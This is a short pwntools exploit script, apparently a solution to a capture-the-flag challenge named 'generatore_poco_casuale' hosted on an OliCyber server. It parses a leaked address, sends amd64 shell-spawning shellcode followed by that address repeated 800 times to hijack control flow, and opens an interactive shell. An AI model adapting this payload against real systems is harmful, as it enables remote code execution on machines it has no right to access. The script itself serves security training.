from pwn import *

context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote("gpc.challs.olicyber.it", 10104)
else:
    r = gdb.debug('./generatore_poco_casuale', '''
                        b *randomGenerator+149  
                        continue
                  ''')

r.recvuntil(b'Ecco il numero casuale: ')
shellcode_address = int(r.recvline().strip().decode()) + 6
print(f"shellcode_address: {hex(shellcode_address)}")

r.recvuntil(b'Desideri continuare? (s/n)')

payload = b's' + b'\0'*7 + asm(shellcraft.amd64.linux.sh(), arch='x86_64')
payload += p64(shellcode_address)*800
r.sendline(payload)
r.interactive()